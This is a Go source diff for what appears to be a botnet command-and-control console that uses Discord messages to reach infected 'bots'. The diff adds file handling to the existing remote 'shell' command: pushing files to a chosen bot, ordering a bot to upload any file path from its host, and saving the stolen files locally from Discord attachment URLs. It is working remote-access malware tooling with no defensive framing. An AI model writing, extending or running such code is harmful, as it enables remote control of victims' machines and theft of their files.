@@ -3,8 +3,10 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"net/http"
 	"os"
 	"os/signal"
+	"strings"
 	"syscall"
 	"time"
 
@@ -21,6 +23,7 @@ type Job struct {
 
 var bots = make(map[string]time.Time)
 var jobs []Job
+var files = make(map[string]string)
 
 func main() {
 	println("Attempting to create new session")
@@ -62,9 +65,12 @@ func main() {
 				listJobs()
 			}
 		case "bots":
-			fmt.Println("Listing Clients")
 			if len(input) == len(action) {
 				listClients()
+			}
+		case "files":
+			if len(input) == len(action) {
+				listFiles()
 			}
 		case "shell":
 			var target string
@@ -80,9 +86,40 @@ func main() {
 			executeShellCommand(target, command, dg)
 			addJobToQueue(input)
 		case "sendf":
-			fmt.Println("Sending file")
+			var target string
+			var filename string
+			n, err := fmt.Sscanf(input, "sendf %s %s", &target, &filename)
+			if err != nil {
+				fmt.Printf("%s\n> ", err.Error())
+				continue
+			} else if n != 2 {
+				print("Incorrect \"sendf\" arguments\n> ")
+				continue
+			}
+			sendFile(target, filename, dg)
+		case "reqf":
+			var target string
+			var filepath string
+			n, err := fmt.Sscanf(input, "reqf %s %s", &target, &filepath)
+			if err != nil {
+				fmt.Printf("%s\n> ", err.Error())
+				continue
+			} else if n != 2 {
+				print("Incorrect \"reqf\" arguments\n> ")
+				continue
+			}
+			requestFile(target, filepath, dg)
 		case "savef":
-			fmt.Println("Downloading file")
+			var filename string
+			n, err := fmt.Sscanf(input, "savef %s", &filename)
+			if err != nil {
+				fmt.Printf("%s\n> ", err.Error())
+				continue
+			} else if n != 1 {
+				print("Incorrect \"savef\" argument\n> ")
+				continue
+			}
+			saveFile(filename)
 		default:
 			fmt.Printf("%s is not a valid command.\n> ", input)
 			continue
@@ -120,17 +157,36 @@ func listClients() {
 	}
 }
 
+func listFiles() {
+	fmt.Printf("================================================================\n" +
+		"Filename\t\t\t\t\tURL\n" +
+		"================================================================\n")
+	for filename, url := range files {
+		fmt.Printf("%s\t%s\n", filename, url)
+	}
+}
+
 func executeShellCommand(target string, command string, dg *discordgo.Session) {
 	message := fmt.Sprintf("%s\n%s\n%q", target, "shell", command)
 	discord.SendMessage(dg, message)
 }
 
-func sendFile(target string, filename string) {
-
+func sendFile(target string, filename string, dg *discordgo.Session) {
+	content := fmt.Sprintf("%s\n%s\n%q", target, "sendf", "")
+	discord.SendComplexMessage(dg, content, filename)
 }
 
-func downloadFile(filename string) {
+func requestFile(target string, filepath string, dg *discordgo.Session) {
+	message := fmt.Sprintf("%s\n%s\n%q", target, "reqf", filepath)
+	discord.SendMessage(dg, message)
+}
 
+func saveFile(filename string) {
+	if url, ok := files[filename]; ok {
+		discord.DownloadFile(filename, url)
+	} else {
+		fmt.Printf("%s is not a recent file uploaded by a bot\n", filename)
+	}
 }
 
 // This function will be called (due to AddHandler above) every time a new
@@ -156,12 +212,21 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	}
 	if job == "Connected" {
 		if _, ok := bots[botID]; ok == false {
-			fmt.Printf("New connection from %s\n", botID)
+			fmt.Printf("\nNew connection from %s\n> ", botID)
 		}
 		bots[botID] = time.Now()
 	} else {
-		str := fmt.Sprintf("Job Response:\n\tJob: %s\n\tBotID: %s\n\tResponse: %s", job, botID, response)
-		println(str)
+		if strings.HasPrefix(job, "reqf") {
+			attachment := m.Attachments[0]
+			filename := attachment.Filename
+			url := attachment.URL
+			response = fmt.Sprintf("Requested file uploaded as: %s\nURL: %s\n", filename, url)
+			files[filename] = url
+		}
+		fmt.Printf("\n****************Job Response****************\n"+
+			"BotID: %s\nJob: %s\n%s"+
+			"********************************************\n> ", botID, job, response)
+
 	}
 }
 
@@ -173,4 +238,21 @@ func addJobToQueue(command string) {
 	} else {
 		jobs = append(jobs, job)
 	}
+}
+
+func getFileContentType(out *os.File) (string, error) {
+
+	// Only the first 512 bytes are used to sniff the content type.
+	buffer := make([]byte, 512)
+
+	_, err := out.Read(buffer)
+	if err != nil {
+		return "", err
+	}
+
+	// Use the net/http package's handy DectectContentType function. Always returns a valid
+	// content-type by returning "application/octet-stream" if no others seemed to match.
+	contentType := http.DetectContentType(buffer)
+
+	return contentType, nil
 }
